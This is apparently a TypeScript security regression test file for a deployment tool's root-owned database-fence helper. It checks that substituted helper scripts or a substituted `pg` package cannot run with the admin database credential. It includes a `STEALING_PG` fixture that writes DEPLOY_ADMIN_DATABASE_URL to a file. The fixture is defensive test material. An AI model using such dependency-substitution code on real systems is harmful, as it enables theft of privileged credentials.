    // THE LOAD-BEARING TEST FOR BOTH CRITICALS. Phase 1 is an ordinary fence, which publishes the
    // shipped helper into the protected path. Phase 2 replaces the CHECKOUT's file — the account
    // owns that directory and does not need to delete anything, only to supply something that
    // works — and fences again.
    //
    // MUTATION ROUTE (each verified by making the change locally and re-running):
    //   1. drop the `[[ ! -f "${DB_FENCE_SCRIPT_COPY}" ]]` guard from publish_fence_script_copy()
    //      so it publishes unconditionally, as r30 did: ${dir}/STOLEN appears, the protected copy
    //      becomes the substituted bytes, and the copy-content assertion fails.
    //   2. in deploy.sh or install.sh, change the invocation back to `node "$DB_FENCE_SCRIPT"`
    //      (which is what r30 shipped in both): ${dir}/STOLEN appears for that entrypoint, holding
    //      the admin URL, and the calls log shows SUBSTITUTED.
    const dir = mkdtempSync(join(tmpdir(), 'ims-r31-swap-'))
    try {
      writeFenceCheckout(dir, shippedHelper(dir))
      const shipped = readFileSync(checkoutHelper(dir), 'utf8')
      const run = (): { status: number; output: string } => {
        const program = [
          'set -euo pipefail',
          // What the resolution says about a refused promotion goes to stderr; an operator sees
          // both streams, so the harness does too.
          'exec 2>&1',
          entry.preamble(dir),
          CUTOVER_DIR_PRIMITIVES,
          shellFunction(entry.source, 'fence_db_connections'),
          'fence_db_connections',
          'echo "FENCE_UP=${DB_FENCE_UP}"',
        ].join('\n')
        return runShell(program)
      }

      const first = run()
      assert.equal(first.status, 0, `phase 1 must fence normally:\n${first.output}`)
      const copy = join(dir, 'recovery', 'app', 'scripts', 'fence-db-connections.mjs')
      assert.ok(existsSync(copy), `phase 1 must publish a protected copy:\n${first.output}`)
      assert.equal(readFileSync(copy, 'utf8'), shipped, 'and it is the shipped helper')
      assert.match(readFileSync(join(dir, 'calls.log'), 'utf8'), /^SHIPPED .*--fence/m, 'and the fence really ran')

      // PHASE 2 — the substitution, after the publication, which is the interval r30 left open.
      writeFileSync(checkoutHelper(dir), substitutedHelper(dir))
      const second = run()

      assert.ok(
        !existsSync(join(dir, 'STOLEN')),
        `the substituted helper must never be executed with DEPLOY_ADMIN_DATABASE_URL:\n${second.output}`,
      )
      assert.ok(
        !/SUBSTITUTED/.test(readFileSync(join(dir, 'calls.log'), 'utf8')),
        `and never invoked at all:\n${readFileSync(join(dir, 'calls.log'), 'utf8')}`,
      )
      assert.equal(
        readFileSync(copy, 'utf8'),
        shipped,
        'and the protected copy must still be the bytes the first fence published, not the replacement',
      )
      // AND IT SAID SO, naming both digests and the only thing that could authorise the swap.
      assert.match(second.output, /was NOT promoted/, `the divergence must be reported:\n${second.output}`)
      assert.match(second.output, /IMS_FENCE_SCRIPT_SHA256/, 'naming what a legitimate rotation needs')
      // BOTH PINS (r33). A rotation republishes the dependency closure as well, out of the same
      // application-writable checkout, so advice that named only the entry-file digest would send
      // an operator into a refusal. MUTATION ROUTE: drop IMS_FENCE_ARTEFACT_SHA256 from the
      // divergence note in publish_fence_script_copy() and this fails.
      assert.match(second.output, /IMS_FENCE_ARTEFACT_SHA256/, 'and the whole-tree digest it also needs')
      // NOT FATAL, though: refusing here would let the same account stop every future cutover by
      // writing one byte into a file it owns.
      assert.equal(second.status, 0, `and the run must go on with the protected copy:\n${second.output}`)
      assert.match(second.output, /FENCE_UP=true/, 'having fenced with it')
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
}

// ---------------------------------------------------------------------------
// The rotation path, exercised against the library itself.
//
// A mechanism nobody can update is its own failure mode, so there has to be a way to move the
// protected copy forward — and it may not be anything the checkout can produce, because the
// checkout is what is being authenticated. These run the shipped library, against real files.
// ---------------------------------------------------------------------------

/** The library alone, pointed at a scratch directory, with a checkout beside it. */
/**
 * THE PINS GO IN FRONT OF THE LIBRARY, NOT OVER IT (o3d-secops r2).
 *
 * ${DB_FENCE_EXPECTED_SHA256} and ${DB_FENCE_EXPECTED_ARTEFACT_SHA256} are what AUTHENTICATES a
 * rotation, and they are `readonly` for the same reason the paths are. These harnesses used to
 * assign them after the source, which bash now refuses — so they set the environment variables the
 * library derives them FROM, which is the route the operator has and the derivation the shipped
 * line performs. `pins` is spliced BEFORE the library text; nothing else may go there.
 */
function rotationHarness(
  dirs: { app: string; recovery: string; state: string },
  body: string[],
  pins: string[] = [],
): string {
  return [
    'set -uo pipefail',
    // The library reports a refused promotion on stderr, because every caller reads it through a
    // command substitution and a global set inside one dies with the subshell. Merged here so the
    // harness sees what an operator would.
    'exec 2>&1',
    ...pins,
    ...protectedLibraryLinesAt(dirs.recovery),
    `DB_FENCE_SCRIPT=${JSON.stringify(join(dirs.app, 'scripts', 'fence-db-connections.mjs'))}`,
    `DB_FENCE_STATE=${JSON.stringify(join(dirs.state, 'db-connect-fence.json'))}`,
    'chown(){ :; }',
    ...body,
  ].join('\n')
}

/**
 * THE TWO THINGS db_fence_preflight() ASKS ITS CALLER FOR, AS OBSERVABLES (o3d-secops r3).
 *
 * The file a preflight would execute is no longer a variable any of these harnesses can read: it
 * is a `local` of the function that runs it, which is the whole point of the round. So what is
 * observed instead is the ARGV — strictly stronger, because it is the bytes root would actually
 * have executed rather than a variable somebody hoped named them.
 *
 * `runner` stands in for the entrypoints' `as_app_user env …`; db_fence_preflight() hands it
 * `node <path> --preflight [identity args]`, so ${2} is the file. `notice` stands in for warn().
 *
 * ${TMPDIR} is redirected at a scratch directory so that "no throwaway tree survives" is asked of
 * the FILESYSTEM. The assertion it replaces was `TEMP=[]` — a variable being empty, which is
 * exactly the kind of evidence this round found wanting.
 */
function preflightSpies(scratch: string): string[] {
  mkdirSync(scratch, { recursive: true })
  return [
    `export TMPDIR=${JSON.stringify(scratch)}`,
    `PROBE_PATH_FILE=${JSON.stringify(`${scratch}.probe-path`)}`,
    ':> "${PROBE_PATH_FILE}"',
    'notice() { echo "NOTICE=[$*]"; }',
    'runner() { echo "EXEC=[$*]"; printf "%s" "${2:-}" > "${PROBE_PATH_FILE}";'
      + ' echo "CONTENT=[$(cat "${2:-/dev/null}" 2>/dev/null)]"; }',
    // The same recording, but it really EXECUTES what it was handed — for the cases whose claim is
    // "the credential reached nothing", where a runner that only records would prove the recording.
    'exec_runner() { echo "EXEC=[$*]"; printf "%s" "${2:-}" > "${PROBE_PATH_FILE}"; env "$@"; }',
    'report_probe() { echo "PROBE=[$(cat "${PROBE_PATH_FILE}")]";'
      + ' echo "TMPLEFT=[$(ls -A "${TMPDIR}" 2>/dev/null | tr "\\n" " ")]"; }',
  ]
}

function rotationDirs(): { app: string; recovery: string; state: string } {
  const root = mkdtempSync(join(tmpdir(), 'ims-r31-rot-'))
  mkdirSync(join(root, 'app', 'scripts'), { recursive: true })
  // writeCheckoutPg() seals the modes: since r33 an entry-file pin alone may only publish from a
  // source nobody but the publisher can write, and these cases are about the ENTRY FILE.
  writeCheckoutPg(join(root, 'app'))
  mkdirSync(join(root, 'recovery'), { recursive: true })
  mkdirSync(join(root, 'state'), { recursive: true })
  return { app: join(root, 'app'), recovery: join(root, 'recovery'), state: join(root, 'state') }
}

const sha256 = (text: string): string =>
  execFileSync('sha256sum', [], { input: text, encoding: 'utf8' }).split(' ')[0]

test('r31: the protected helper is bootstrapped once and then only rotated by an authenticated digest', () => {
  // MUTATION ROUTE (each verified locally):
  //   * make publish_fence_script_copy() publish whenever ${DB_FENCE_SCRIPT} exists (r30's rule)
  //     and case 2 fails: the protected copy becomes v2 with nothing authorising it.
  //   * drop the `[[ "${digest}" != "${DB_FENCE_EXPECTED_SHA256}" ]]` refusal from
  //     _fence_stage_and_publish() and case 3 fails: a wrong expected digest publishes anyway.
  //   * delete the _fence_rewrite_record_digest() call and case 4 fails at the record assertion,
  //     and every later run would be refused by db_fence_script_in_use() — a rotation that bricks
  //     the mechanism is not a rotation.
  //   * delete the ${DB_FENCE_STATE} arm and case 5 rotates the helper out from under a standing
  //     fence, so the version that would RELEASE it is not the version that RAISED it.
  const dirs = rotationDirs()
  const helper = join(dirs.app, 'scripts', 'fence-db-connections.mjs')
  const copy = join(dirs.recovery, 'app', 'scripts', 'fence-db-connections.mjs')
  const record = join(dirs.recovery, 'db-fence-identity.env')
  const V1 = '// v1, the shipped helper\n'
  const V2 = '// v2, the release being deployed\n'
  try {
    // CASE 1 — BOOTSTRAP. Nothing protected exists, so there is nothing to substitute FOR and the
    // checkout's bytes are published. Trust on first use, and it is named as such.
    writeFileSync(helper, V1)
    const bootstrap = runShell(rotationHarness(dirs, ['db_fence_script_in_use && echo']))
    assert.equal(bootstrap.status, 0, `the bootstrap must succeed:\n${bootstrap.output}`)
    assert.match(bootstrap.output, new RegExp(copy.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')), 'and return the protected path')
    assert.equal(readFileSync(copy, 'utf8'), V1, 'and hold the checkout bytes')
    // The record a raised fence would have written, so the digest binding is live for the rest.
    writeFileSync(
      record,
      [
        'db_app_host=127.0.0.1',
        'db_app_port=5432',
        'db_app_user=imsapp',
        'db_app_database=imsdb',
        `fence_script_sha256=${sha256(V1)}`,
        'fence_identity_complete=1',
        '',
      ].join('\n'),
    )

    // CASE 2 — THE CHECKOUT MOVES ON ITS OWN. This is the CRITICAL: the application account owns
    // that file, so a newer version there is not evidence of anything.
    writeFileSync(helper, V2)
    const drift = runShell(rotationHarness(dirs, ['db_fence_script_in_use && echo']))
    assert.equal(drift.status, 0, `a diverged checkout is not fatal:\n${drift.output}`)
    assert.equal(readFileSync(copy, 'utf8'), V1, 'and it is NOT promoted')
    assert.match(drift.output, /was NOT promoted/, `and the divergence is reported:\n${drift.output}`)
    assert.match(drift.output, new RegExp(sha256(V2)), 'naming what the checkout now hashes to')
    assert.match(drift.output, new RegExp(sha256(V1)), 'and what the protected copy hashes to')
    assert.match(drift.output, /IMS_FENCE_SCRIPT_SHA256/, 'and what would adopt it')
    assert.match(drift.output, /IMS_FENCE_ARTEFACT_SHA256/, 'both of them, since a rotation republishes the closure too (r33)')

    // CASE 3 — AN EXPECTED DIGEST THAT DOES NOT MATCH THE CHECKOUT. The rotation is refused and
    // the standing copy is untouched: an operator who was given the wrong digest, or a checkout
    // that was tampered with between the release and the box, are the same event here.
    const wrong = runShell(rotationHarness(dirs, ['db_fence_script_in_use && echo'], [`IMS_FENCE_SCRIPT_SHA256=${sha256('// something else\n')}`]))
    assert.notEqual(wrong.status, 0, `a digest that does not match must refuse:\n${wrong.output}`)
    assert.equal(readFileSync(copy, 'utf8'), V1, 'and change nothing')
    assert.ok(!existsSync(join(dirs.recovery, 'app', 'scripts', '.fence-db-connections.mjs.staged')), 'and leave no staged file behind')

    // CASE 4 — THE LEGITIMATE UPGRADE. The digest comes from the release, on the root invocation;
    // the bytes are staged inside the root-owned directory, hashed THERE, and that same file is
    // renamed into place, so the checkout cannot change between the check and the publication.
    const rotate = runShell(rotationHarness(dirs, ['db_fence_script_in_use && echo'], [`IMS_FENCE_SCRIPT_SHA256=${sha256(V2)}`]))
    assert.equal(rotate.status, 0, `the authenticated rotation must succeed:\n${rotate.output}`)
    assert.equal(readFileSync(copy, 'utf8'), V2, 'and the protected copy moves')
    const after = readFileSync(record, 'utf8')
    assert.match(after, new RegExp(`^fence_script_sha256=${sha256(V2)}$`, 'm'), 'and the record binds to the file it now names')
    assert.match(after, /^db_app_database=imsdb$/m, 'while the identity it describes is untouched')
    assert.match(after, /^fence_identity_complete=1$/m, 'and it still ends with its sentinel')

    // CASE 5 — NOT WHILE A FENCE MAY BE STANDING. The helper that raised it is the helper that
    // has to release it, from a record the raise wrote.
    writeFileSync(helper, '// v3\n')
    writeFileSync(join(dirs.state, 'db-connect-fence.json'), '{}\n')
    const held = runShell(rotationHarness(dirs, ['db_fence_script_in_use && echo'], [`IMS_FENCE_SCRIPT_SHA256=${sha256('// v3\n')}`]))
    assert.equal(readFileSync(copy, 'utf8'), V2, 'a standing fence blocks the rotation')
    assert.match(held.output, /Release the fence first/, `and says why:\n${held.output}`)
    assert.equal(held.status, 0, 'without failing the run, which still has a fence to release')
  } finally {
    rmSync(join(dirs.app, '..'), { recursive: true, force: true })
  }
})

test('r31: a protected copy removed by root is not silently reminted from the checkout', () => {
  // Only root can delete out of ${DB_FENCE_RECOVERY_DIR}, so a record naming a copy that is GONE
  // is not a bootstrap — it is a state the application account cannot have produced. Publishing a
  // fresh copy there would both promote application bytes and leave a copy that can never match
  // the record again, refusing every run after this one.
  //
  // MUTATION ROUTE: move the `recorded`/`-f` check in db_fence_script_in_use() to AFTER the
  // publish_fence_script_copy() call and this fails on both assertions — a copy appears, and the
  // run is then refused for a mismatch it created itself.
  const dirs = rotationDirs()
  const copy = join(dirs.recovery, 'app', 'scripts', 'fence-db-connections.mjs')
  try {
    writeFileSync(join(dirs.app, 'scripts', 'fence-db-connections.mjs'), '// v1\n')
    writeFileSync(
      join(dirs.recovery, 'db-fence-identity.env'),
      `db_app_host=127.0.0.1\ndb_app_port=5432\ndb_app_user=imsapp\ndb_app_database=imsdb\nfence_script_sha256=${sha256('// v1\n')}\nfence_identity_complete=1\n`,
    )
    const result = runShell(rotationHarness(dirs, ['db_fence_script_in_use && echo']))
    assert.notEqual(result.status, 0, `a record with no copy must refuse:\n${result.output}`)
    assert.match(result.output, /Only root can remove it/, 'saying what that state means')
    assert.ok(!existsSync(copy), 'and no replacement may be minted from the application checkout')
  } finally {
    rmSync(join(dirs.app, '..'), { recursive: true, force: true })
  }
})

test('r34: a dry run computes the candidate digest by READING, and hands back nothing to execute', () => {
  // THE r31 TEST, REVERSED BY A RULING. r31 made the dry run snapshot the checkout's helper into a
  // root-owned throwaway and run THAT, on the reasoning that root ownership stops the application
  // account changing the file between the check and the exec. It does — and it says nothing about
  // where the bytes came from. r33 then vendored the whole closure into that same snapshot and ran
  // it with DEPLOY_ADMIN_DATABASE_URL, which is the credential-theft path in a procedure the
  // refusal itself advertised. So the dry run reads and hashes; it does not run.
  //
  // MUTATION ROUTE (each verified by making the change locally and re-running):
  //   1. put r33's tail back — nominate the snapshot's helper unconditionally at the end of
  //      db_fence_preflight()'s resolution — and PHASE 1's `runner` is called. Measured: EXEC
  //      names ${TMPDIR}/…/scripts/fence-db-connections.mjs on an unpinned run.
  //   2. delete the `rm -rf "${_fence_probe_dir}"` on the refusal path: nothing is executed but
  //      TMPLEFT names the surviving tree, so a later caller still has something to run.
  //   3. drop the digest match from the pinned arm — accept any candidate when
  //      IMS_FENCE_ARTEFACT_SHA256 is merely SET — and PHASE 2's control (a pin that names a
  //      different tree) stops being refused.
  const dirs = rotationDirs()
  try {
    writeFileSync(join(dirs.app, 'scripts', 'fence-db-connections.mjs'), '// v1\n')
    rmSync(dirs.recovery, { recursive: true, force: true })

    // PHASE 1 — NO ARTEFACT, NO PIN. The digest is still produced; nothing is offered to run.
    const probe = runShell(
      rotationHarness(dirs, [
        ...preflightSpies(join(dirs.app, '..', 'scratch-1')),
        'db_fence_probe_digests; echo "DRC=$?"',
        'echo "CANDIDATE=[${DB_FENCE_PROBE_ARTEFACT_SHA256}]"',
        'echo "STANDING=[${DB_FENCE_PROBE_STANDING_SHA256}]"',
        'db_fence_preflight notice -- runner; echo "RC=$?"',
        'echo "REASON=[${DB_FENCE_PROBE_REASON}]"',
        'report_probe',
      ]),
    )
    assert.match(probe.output, /^RC=1$/m, `an unauthenticated candidate is not preflightable:\n${probe.output}`)
    assert.doesNotMatch(probe.output, /^EXEC=/m, 'and NOTHING was executed — the runner was never reached')
    assert.match(probe.output, /^PROBE=\[\]$/m, 'so no argv named a file')
    assert.match(probe.output, /^TMPLEFT=\[\s*\]$/m, 'and no tree left on disk for a later caller to find')
    const candidate = /^CANDIDATE=\[([0-9a-f]{64})\]$/m.exec(probe.output)?.[1] ?? ''
    assert.match(candidate, /^[0-9a-f]{64}$/, `the ANSWER survives the restriction:\n${probe.output}`)
    assert.match(probe.output, /^STANDING=\[\]$/m, 'and there is no standing artefact to report')
    assert.match(probe.output, /^REASON=\[.*DEPLOY_ADMIN_DATABASE_URL.*\]$/m, `and the refusal says what it is about:\n${probe.output}`)
    assert.ok(!existsSync(dirs.recovery), 'and nothing at all under /etc — not even the recovery directory')

    // THE VALUE IS THE ONE A PUBLICATION WOULD RECORD, which is what makes it usable as a pin.
    const published = runShell(
      rotationHarness(dirs, ['db_fence_script_in_use >/dev/null; echo "RC=$?"'], [`IMS_FENCE_ARTEFACT_SHA256=${candidate}`]),
    )
    assert.match(published.output, /^RC=0$/m, `the digest a dry run reports must authorise the publication:\n${published.output}`)
    assert.equal(
      /^fence_artefact_sha256=([0-9a-f]{64})$/m.exec(readFileSync(join(dirs.recovery, 'db-fence-artefact.sha256'), 'utf8'))?.[1],
      candidate,
      'and be what the record ends up holding',
    )
    rmSync(dirs.recovery, { recursive: true, force: true })

    // PHASE 2 — AND A PIN THAT AUTHENTICATES THE CANDIDATE DOES HAND BACK A SNAPSHOT. Without
    // this the fix would be a mechanism that can never preflight before its first publication,
    // which is the failure mode a refusal has to avoid.
    const pinned = runShell(
      rotationHarness(dirs, [
        ...preflightSpies(join(dirs.app, '..', 'scratch-2')),
        'db_fence_preflight notice -- runner; echo "RC=$?"',
        'report_probe',
      ], [`IMS_FENCE_ARTEFACT_SHA256=${candidate}`]),
    )
    assert.match(pinned.output, /^RC=0$/m, `a pinned candidate is preflightable:\n${pinned.output}`)
    const probed = /^PROBE=\[(.*)\]$/m.exec(pinned.output)?.[1] ?? ''
    assert.match(probed, /\/scripts\/fence-db-connections\.mjs$/, `something really was executed:\n${pinned.output}`)
    assert.notEqual(probed, join(dirs.app, 'scripts', 'fence-db-connections.mjs'), 'never the checkout file in place')
    // CONTENT is captured INSIDE the runner, so it is what the file held at the instant of the
    // call — not what happened to be on disk afterwards.
    assert.match(pinned.output, /^CONTENT=\[\/\/ v1\]$/m, 'but the same bytes, snapshotted')
    assert.match(pinned.output, /^NOTICE=\[This dry run probes with a throwaway copy/m,
      `and the operator was told which of the two sources it was:\n${pinned.output}`)
    assert.match(pinned.output, /^TMPLEFT=\[\s*\]$/m, 'and the snapshot is destroyed by the call that made it')
    assert.ok(!existsSync(dirs.recovery), 'and a dry run still publishes nothing')

    // THE CONTROL FOR PHASE 2: a pin that names a DIFFERENT tree executes nothing, so what was
    // accepted above was the match and not the mere presence of the variable.
    const wrong = runShell(
      rotationHarness(dirs, [
        ...preflightSpies(join(dirs.app, '..', 'scratch-3')),
        'db_fence_preflight notice -- runner; echo "RC=$?"',
        'report_probe',
      ], [`IMS_FENCE_ARTEFACT_SHA256=${'0'.repeat(64)}`]),
    )
    assert.match(wrong.output, /^RC=1$/m, `a pin that does not match authorises nothing:\n${wrong.output}`)
    assert.doesNotMatch(wrong.output, /^EXEC=/m, wrong.output)
    assert.match(wrong.output, /^PROBE=\[\]$/m, wrong.output)
    assert.match(wrong.output, /^TMPLEFT=\[\s*\]$/m, 'and the tree it assembled to check is gone')
  } finally {
    rmSync(join(dirs.app, '..'), { recursive: true, force: true })
  }
})

test('o3d-secops r3: after a real publish and a real preflight, the six steering names are not globals', () => {
  // THE LOAD-BEARING ASSERTION OF THE ROUND, asked of a live shell rather than of the source.
  //
  // Four names the census called reports steered privileged execution, authentication, publication
  // and deletion, and the remedy was not `readonly` — none of them can carry it — but that they
  // stop being script-scope names at all. A static rule says the declarations are gone. This says
  // the VALUES are gone: after the publication path and the preflight path have both run for real,
  // bash itself is asked whether each name exists, and the answer must be no.
  //
  // MUTATION ROUTE (verified by making each change locally and re-running):
  //   1. put `DB_FENCE_SOURCE_UNTRUSTED_PATH=""` back at script scope in the library: that name
  //      reports `set` and the loop fails, naming it.
  //   2. delete the `local DB_FENCE_SOURCE_UNTRUSTED_PATH=""` from _fence_stage_and_publish(): the
  //      assignment two frames down creates the global again and the same assertion fails.
  //   3. delete the `local -a _FENCE_SRC_*` from _fence_vendor_into(): all three report `set`.
  //   4. have db_fence_preflight() publish its resolved path into a global before running it —
  //      on EITHER arm: DB_FENCE_PROBE_SCRIPT reports `set`. Both arms are exercised below,
  //      because a mutation of the candidate arm alone is invisible to a run that has a standing
  //      artefact, and the first draft of this test had only the standing one. (Measured: the
  //      candidate-arm mutation left this test green until the second arm was added.)
  const dirs = rotationDirs()
  const scratch = join(dirs.app, '..', 'scratch-globals')
  const NAMES = [
    'DB_FENCE_PROBE_SCRIPT', 'DB_FENCE_PROBE_TEMP', 'DB_FENCE_SOURCE_UNTRUSTED_PATH',
    '_FENCE_SRC_STRICT', '_FENCE_SRC_PACKAGES', '_FENCE_SRC_PARENTS',
  ]
  const probeGlobals = [
    `for n in ${NAMES.join(' ')} DB_FENCE_PROBE_REASON; do`,
    '  echo "GLOBAL ${n}=[${!n+set}]"',
    'done',
  ]
  try {
    writeFileSync(join(dirs.app, 'scripts', 'fence-db-connections.mjs'), '// v1\n')
    rmSync(dirs.recovery, { recursive: true, force: true })
    const digest = runShell(
      rotationHarness(dirs, ['db_fence_probe_digests >/dev/null 2>&1', 'echo "CANDIDATE=[${DB_FENCE_PROBE_ARTEFACT_SHA256}]"']),
    )
    const candidate = /^CANDIDATE=\[([0-9a-f]{64})\]$/m.exec(digest.output)?.[1] ?? ''
    assert.match(candidate, /^[0-9a-f]{64}$/, digest.output)

    const run = runShell(
      rotationHarness(dirs, [
        ...preflightSpies(scratch),
        // THE PUBLICATION PATH, for real — it is the one that runs _fence_stage_and_publish(),
        // _fence_vendor_into(), _fence_source_paths() and _fence_source_trust().
        'db_fence_script_in_use >/dev/null; echo "PUBLISHED=$?"',
        // AND THE PREFLIGHT PATH, for real — it is the one that resolves and executes.
        'db_fence_preflight notice -- runner >/dev/null; echo "PREFLIGHT=$?"',
        ...probeGlobals,
        'report_probe',
      ], [`IMS_FENCE_ARTEFACT_SHA256=${candidate}`]),
    )

    // PRECONDITIONS — both paths really ran, or the loop below is asking about code that never
    // executed and every answer would be "unset" for the wrong reason.
    assert.match(run.output, /^PUBLISHED=0$/m, `the publication path must have run:\n${run.output}`)
    assert.match(run.output, /^PREFLIGHT=0$/m, `and the preflight path with it:\n${run.output}`)
    assert.ok(existsSync(join(dirs.recovery, 'app', 'scripts', 'fence-db-connections.mjs')),
      'and the artefact really was published, which is what proves _fence_source_trust() ran')
    assert.match(run.output, new RegExp(`^PROBE=\\[${escapeRe(join(dirs.recovery, 'app', 'scripts', 'fence-db-connections.mjs'))}\\]$`, 'm'),
      `and something really was executed:\n${run.output}`)

    // THE CLAIM.
    for (const name of NAMES) {
      assert.match(run.output, new RegExp(`^GLOBAL ${name}=\\[\\]$`, 'm'),
        `${name} must not exist in the shell after both paths have run — it steers execution, `
        + `authentication, publication or deletion:\n${run.output}`)
    }

    // AND THE CONTROL, because "no name reported `set`" would also be the answer if `${!n+set}`
    // never worked: a name that IS deliberately a global reports `set` in the same loop.
    assert.match(run.output, /^GLOBAL DB_FENCE_PROBE_REASON=\[set\]$/m,
      `the probe must be able to SEE a global, or the six above prove nothing:\n${run.output}`)

    // AND THE OTHER ARM. With the artefact discarded and the same pin supplied, the preflight
    // resolves and runs the CANDIDATE it assembles from the checkout — a different branch, with a
    // different path, a different digest comparison and a throwaway to destroy afterwards.
    rmSync(dirs.recovery, { recursive: true, force: true })
    const fromCandidate = runShell(
      rotationHarness(dirs, [
        ...preflightSpies(join(dirs.app, '..', 'scratch-candidate')),
        'db_fence_preflight notice -- runner >/dev/null; echo "PREFLIGHT=$?"',
        ...probeGlobals,
        'report_probe',
      ], [`IMS_FENCE_ARTEFACT_SHA256=${candidate}`]),
    )
    assert.match(fromCandidate.output, /^PREFLIGHT=0$/m,
      `precondition: the candidate arm must have run:\n${fromCandidate.output}`)
    assert.match(fromCandidate.output, /^PROBE=\[\/.*\/scripts\/fence-db-connections\.mjs\]$/m,
      `and executed a checkout-derived tree:\n${fromCandidate.output}`)
    assert.doesNotMatch(fromCandidate.output,
      new RegExp(`^PROBE=\\[${escapeRe(join(dirs.recovery, 'app'))}`, 'm'),
      'which is NOT the standing artefact, because there is not one')
    for (const name of NAMES) {
      assert.match(fromCandidate.output, new RegExp(`^GLOBAL ${name}=\\[\\]$`, 'm'),
        `${name} must not exist after the candidate arm either:\n${fromCandidate.output}`)
    }
    assert.match(fromCandidate.output, /^TMPLEFT=\[\s*\]$/m, 'and the throwaway it ran is destroyed')
  } finally {
    rmSync(join(dirs.app, '..'), { recursive: true, force: true })
  }
})

test('o3d-secops r3: each entrypoint\'s own preflight line runs the standing artefact through the library', () => {
  // THE WIRING, RUN RATHER THAN READ. Moving the exec into the library changed both entrypoints'
  // call from `node "${VAR}" …` to `db_fence_preflight warn -- <runner…>`, and the two runners are
  // spelled differently. A static assertion that the call exists would not notice a missing `--`,
  // a notice that is not a command, or a runner whose arguments land in the wrong order — all of
  // which are silent until a cutover.
  //
  // So the LINE IS LIFTED OUT OF THE SHIPPED FILE and executed against the real library, with the
  // entrypoint's own warn() and its own privilege-dropping helper stubbed to report their argv.
  //
  // MUTATION ROUTE (each verified locally): drop the `--` from either call and the invocation
  // returns 1 with nothing executed, so EXEC never appears; swap the notice for a name no function
  // has and the same; put the runner's arguments after the `node` in the library and the argv
  // assertion fails, naming the file.
  const dirs = rotationDirs()
  try {
    writeFileSync(join(dirs.app, 'scripts', 'fence-db-connections.mjs'), '// v1\n')
    rmSync(dirs.recovery, { recursive: true, force: true })
    const digest = runShell(
      rotationHarness(dirs, ['db_fence_probe_digests >/dev/null 2>&1', 'echo "CANDIDATE=[${DB_FENCE_PROBE_ARTEFACT_SHA256}]"']),
    )
    const candidate = /^CANDIDATE=\[([0-9a-f]{64})\]$/m.exec(digest.output)?.[1] ?? ''
    const publish = runShell(
      rotationHarness(dirs, ['db_fence_script_in_use >/dev/null; echo "RC=$?"'], [`IMS_FENCE_ARTEFACT_SHA256=${candidate}`]),
    )
    assert.match(publish.output, /^RC=0$/m, `precondition: an artefact must be standing:\n${publish.output}`)

    for (const script of ['scripts/deploy.sh', 'scripts/update.sh']) {
      const lines = readFileSync(join(process.cwd(), script), 'utf8').split('\n')
      const start = lines.findIndex((line) => /^\s*db_fence_preflight /.test(line))
      assert.ok(start >= 0, `${script}: precondition: it must call db_fence_preflight`)
      const call: string[] = []
      for (let i = start; i < lines.length; i += 1) {
        call.push(lines[i])
        if (!/\\$/.test(lines[i].trimEnd())) break
      }
      assert.ok(call.join('\n').includes(' -- '), `${script}: precondition: the lifted call must be complete:\n${call.join('\n')}`)

      const run = runShell(
        rotationHarness(dirs, [
          ...preflightSpies(join(dirs.app, '..', `scratch-${script.replace(/\W/g, '-')}`)),
          'warn() { echo "WARN: $*"; }',
          // The two spellings, each reporting exactly what the library handed it.
          'as_app_user() { echo "EXEC=[$*]"; printf "%s" "${2:-}" > "${PROBE_PATH_FILE}"; }',
          'run_as_user() { local who="$1"; shift; echo "AS=${who}"; echo "EXEC=[$*]"; }',
          'APP_USER=ims-app',
          'DATABASE_URL=postgresql://app:pw@127.0.0.1:5432/imsdb',
          'DEPLOY_ADMIN_DATABASE_URL=postgresql://admin:pw@127.0.0.1:5432/imsdb',
          'dry_rc=0',
          ...call,
          'echo "DRY_RC=${dry_rc}"',
          'echo "REASON=[${DB_FENCE_PROBE_REASON}]"',
        ]),
      )
      assert.match(run.output, /^DRY_RC=0$/m, `${script}: the lifted call must succeed:\n${run.output}`)
      assert.match(run.output, /^REASON=\[\]$/m,
        `${script}: an empty reason is how the entrypoint learns the helper ran:\n${run.output}`)
      assert.match(run.output, /^WARN: This dry run probes with the root-owned artefact at /m,
        `${script}: and the announcement must come back through the entrypoint's own warn():\n${run.output}`)
      const exec = /^EXEC=\[(.*)\]$/m.exec(run.output)?.[1] ?? ''
      // The entrypoint's own environment comes FIRST (it is the runner it wrote), then the
      // library's `node <artefact> --preflight`. The two scripts set different variables, so what
      // is asserted is the shape and the boundary between them, not one script's spelling.
      assert.match(exec, /^env (?:[A-Z_]+=\S+ )+node /,
        `${script}: the runner must be handed its own environment first: ${exec}`)
      assert.match(exec, /\bDEPLOY_ADMIN_DATABASE_URL=\S+/,
        `${script}: including the credential the preflight needs: ${exec}`)
      assert.ok(
        exec.endsWith(`node ${join(dirs.recovery, 'app', 'scripts', 'fence-db-connections.mjs')} --preflight `),
        `${script}: and then the STANDING artefact, appended by the library: ${exec}`,
      )
    }
  } finally {
    rmSync(join(dirs.app, '..'), { recursive: true, force: true })
  }
})

// ---------------------------------------------------------------------------
// r32: SUBSTITUTION OF THE IMPORTS (o3d-2sm1.5, Codex CRITICAL)
//
// r29 closed DELETION, r30 closed SUBSTITUTION AT READ, r31 closed SUBSTITUTION AT WRITE — and
// all three protected ONE FILE. The protected mirror reached its `node_modules` through a symlink
// into the application-owned checkout, and `fence-db-connections.mjs` imports at module scope, so
// the account being defended against still chose executable bytes in every supposedly protected
// process. A substituted `pg` can read argv, exit 0 for --preflight and --fence, print a
// migration URL of its own, and never revoke anything.
//
// The tests below run REAL node processes out of the published artefact. "The substituted package
// never ran" is answered by the filesystem, and the CONTROL in each one proves the substitution
// was live — a test where the swap did nothing would pass for the wrong reason.
// ---------------------------------------------------------------------------

/** A helper that reports which `pg` it got and, if it is the substituted one, what it stole. */
function importReportingHelper(dir: string): string {
  return [
    "import { writeFileSync } from 'node:fs'",
    "import pg from 'pg'",
    `writeFileSync(${JSON.stringify(join(dir, 'flavour.txt'))}, String(pg.FLAVOUR))`,
    '',
  ].join('\n')
}

/** The `pg` an application account would put there instead: it steals the admin credential. */
const STEALING_PG = [
  "require('fs').writeFileSync(process.env.IMS_TEST_STOLEN_PATH, String(process.env.DEPLOY_ADMIN_DATABASE_URL ?? ''))",
  "module.exports = { Client: class {}, FLAVOUR: 'SUBSTITUTED-PG' }",
  '',
].join('\n')

/** The library alone, pointed at a scratch root laid out by writeFenceCheckout(). `pins` as above. */
function artefactHarness(root: string, body: string[], pins: string[] = []): string {
  return [
    'set -uo pipefail',
